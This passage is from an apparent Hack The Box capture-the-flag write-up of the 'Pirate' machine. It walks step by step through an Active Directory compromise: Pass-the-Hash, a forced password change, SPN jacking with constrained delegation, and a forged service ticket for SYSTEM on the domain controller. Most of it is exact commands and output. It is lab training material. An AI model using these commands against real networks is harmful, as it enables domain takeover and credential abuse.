Using the ``Administrator`` NT hash, we performed a Pass-the-Hash attack to authenticate to ``WEB01`` and retrieved the user flag.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ evil-winrm -i 192.168.100.2 -u 'Administrator' -H 'b1aaXXXXXXXXXXXXXXXXXXXXXX4fc3e5'

Evil-WinRM shell v<REDACTED>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
WEB01
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\a.white\Desktop\user.txt
b0f38XXXXXXXXXXXXXXXXXXXXXfb9940
```

---

## Privilege Escalation
### A.white -> A.white_adm

Dumping ``LSA`` and ``SAM`` on ``WEB01`` let us recover the password for the user ``a.white``. Checking her ACLs in BloodHound, we found that she holds ``ForceChangePassword`` rights over ``a.white_adm``.

![](/assets/img/HTB-Pirate-awhite_DACL.png)

We then abused the ``ForceChangePassword`` privilege to change ``a.white_adm`` password :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ bloodyAD --host 10.129.244.95 -d 'pirate.htb' -u 'a.white' -p 'E2nXXXXXXXXXXXJu' set password 'a.white_adm' 'E2nXXXXXXXXXXXJu'
[+] Password changed successfully!
```

### A.white_adm -> DA

Checking ``a.white_adm`` group memberships, we found that she belongs to the ``IT`` group, which holds ``WriteSPN`` over four computers.

![](/assets/img/HTB-Pirate-awhite-adm-path.png)

``a.white_adm`` also holds the ``AllowedToDelegate`` privilege over WEB01, through constrained delegation with protocol transition, something we had already noticed earlier in our NetExec ``--find-delegation`` output. Combining ``AllowedToDelegate`` with ``WriteSPN`` opens the door to an attack known as SPN jacking. 

The idea is simple, since the constrained delegation checks the target SPN name rather than which machine currently owns it, we can move that SPN from its original owner onto another computer account we have `WriteSPN` permissions over, such as `DC01$`, and then reuse the existing delegation rights to request a service ticket for that machine instead.

![](/assets/img/HTB-Pirate-awhite-adm_delegation.png)

#### SPN Jacking

Before exploiting the SPN jacking primitive, we started by saving ``WEB01`` current SPN's to a file, in case we needed to restore them later.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ cat WEB01-spns.txt
tapinego/WEB01.pirate.htb
WSMAN/WEB01
WSMAN/WEB01.pirate.htb
HOST/WEB01.pirate.htb
RestrictedKrbHost/WEB01.pirate.htb
HOST/WEB01
RestrictedKrbHost/WEB01
TERMSRV/WEB01.pirate.htb
TERMSRV/WEB01
HTTP/WEB01
HTTP/WEB01.pirate.htb
```

We started the exploitation by clearing ``WEB01`` current SPN's :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ python3 /opt/krbrelayx/addspn.py 10.129.244.95 -u "pirate.htb\\a.white_adm" -p 'E2nXXXXXXXXXXXJu' --clear -t 'WEB01$' -dc-ip 10.129.244.95
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] Printing object before clearing
DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-09-19T15:51:09.764791
    dNSHostName: WEB01.pirate.htb
    sAMAccountName: WEB01$
    servicePrincipalName: tapinego/WEB01
                          tapinego/WEB01.pirate.htb
                          WSMAN/WEB01
                          WSMAN/WEB01.pirate.htb
                          HOST/WEB01.pirate.htb
                          RestrictedKrbHost/WEB01.pirate.htb
                          HOST/WEB01
                          RestrictedKrbHost/WEB01
                          TERMSRV/WEB01.pirate.htb
                          TERMSRV/WEB01
                          HTTP/WEB01
                          HTTP/WEB01.pirate.htb

[+] SPN Modified successfully
```

Next, we added the target SPN to ``DC01$`` :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ python3 /opt/krbrelayx/addspn.py 10.129.244.95 -u "pirate.htb\\a.white_adm" -p 'E2nXXXXXXXXXXXJu' --spn 'HTTP/WEB01' -t 'DC01$' -dc-ip 10.129.244.95

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

We then requested a TGS for `HTTP/WEB01` while impersonating ``Administrator`` and rewrote its service name to `cifs/DC01.pirate.htb`.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n 10.129.244.95 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ getST.py -spn 'HTTP/WEB01' -impersonate Administrator -dc-ip 10.129.244.95 "pirate.htb/a.white_adm:E2nXXXXXXXXXXXJu" -altservice "cifs/DC01.pirate.htb"
Impacket <REDACTED> - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01@PIRATE.HTB to cifs/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
```

We checked the resulting ticket's to confirm the new SPN :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ describeTicket.py Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
Impacket <REDACTED> - Copyright Fortra, LLC and its affiliated companies

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 9fb03e6f60fe60625ef9b35ea263324e
[*] User Name                     : Administrator
[*] User Realm                    : pirate.htb
[*] Service Name                  : cifs/DC01.pirate.htb
[*] Service Realm                 : PIRATE.HTB

<SNIP>
```

Finally, we used the service ticket to authenticate to ``DC01`` and retrieve the root flag.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ klist
Ticket cache: FILE:Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
Default principal: Administrator@pirate.htb

Valid starting       Expires              Service principal
19/09/2026 22:54:48  20/09/2026 08:54:48  cifs/DC01.pirate.htb@PIRATE.HTB
        renew until 20/09/2026 22:54:48
        
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ smbexec.py -k -no-pass DC01.pirate.htb
Impacket <REDACTED> - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
DC01

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
f17ddXXXXXXXXXXXXXXXXXXXXX0a1654
```

---

## Resources

- [https://trustedsec.com/blog/diving-into-pre-created-computer-accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)
- [https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)